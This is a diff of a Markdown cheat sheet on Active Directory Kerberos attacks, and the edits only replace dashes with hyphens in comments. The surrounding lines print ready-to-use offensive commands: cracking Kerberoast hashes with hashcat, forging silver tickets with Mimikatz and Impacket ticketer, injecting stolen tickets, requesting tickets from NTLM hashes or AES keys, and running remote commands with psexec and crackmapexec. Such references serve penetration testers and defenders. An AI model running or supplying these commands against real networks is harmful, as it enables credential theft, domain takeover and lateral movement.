@@ -53,10 +53,10 @@ Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | O
 # hashcat mode 13100 (Kerberos TGS-REP etype 23)
 hashcat -m 13100 tgs_hashes.txt rockyou.txt
 
-# hashcat mode 19700 (Kerberos TGS-REP etype 17 — AES128)
+# hashcat mode 19700 (Kerberos TGS-REP etype 17 - AES128)
 hashcat -m 19700 tgs_aes.txt rockyou.txt
 
-# hashcat mode 19600 (Kerberos TGS-REP etype 18 — AES256)
+# hashcat mode 19600 (Kerberos TGS-REP etype 18 - AES256)
 hashcat -m 19600 tgs_aes256.txt rockyou.txt
 ```
 
@@ -98,16 +98,16 @@ Rubeus.exe golden /rc4:KRBTGT_NTLM /user:Administrator /domain:corp.local /sid:S
 Forge a TGS for a specific service. Requires service account NTLM hash.
 
 ```bash
-# Mimikatz — CIFS service (file shares)
+# Mimikatz - CIFS service (file shares)
 kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-DOMAIN-SID /target:dc01.corp.local /service:cifs /rc4:SERVICE_NTLM /ptt
 
 # Common service SPNs
-# cifs  — file shares (\\server\share)
-# http  — web services
-# mssql — SQL Server
-# ldap  — LDAP queries
-# host  — PSRemoting, scheduled tasks
-# wsman — WinRM
+# cifs  - file shares (\\server\share)
+# http  - web services
+# mssql - SQL Server
+# ldap  - LDAP queries
+# host  - PSRemoting, scheduled tasks
+# wsman - WinRM
 
 # Impacket ticketer
 ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-DOMAIN-SID -domain corp.local -spn cifs/dc01.corp.local Administrator
@@ -144,13 +144,13 @@ crackmapexec smb target -u admin -H NTLM_HASH -x "whoami"
 Use a stolen Kerberos ticket to authenticate.
 
 ```cmd
-:: Mimikatz — inject ticket
+:: Mimikatz - inject ticket
 kerberos::ptt ticket.kirbi
 
-:: Rubeus — inject ticket
+:: Rubeus - inject ticket
 Rubeus.exe ptt /ticket:base64_ticket
 
-:: Impacket — use ccache
+:: Impacket - use ccache
 export KRB5CCNAME=/path/to/ticket.ccache
 psexec.py -k -no-pass corp.local/admin@target
 ```
@@ -160,13 +160,13 @@ psexec.py -k -no-pass corp.local/admin@target
 Use NTLM hash or AES key to request a legitimate Kerberos ticket.
 
 ```cmd
-:: Mimikatz — request TGT with NTLM hash
+:: Mimikatz - request TGT with NTLM hash
 sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLM_HASH /run:powershell.exe
 
-:: Rubeus — request TGT with AES256 key
+:: Rubeus - request TGT with AES256 key
 Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:AES256_KEY /ptt
 
-:: Rubeus — request TGT with NTLM hash
+:: Rubeus - request TGT with NTLM hash
 Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:NTLM_HASH /ptt
 ```
 
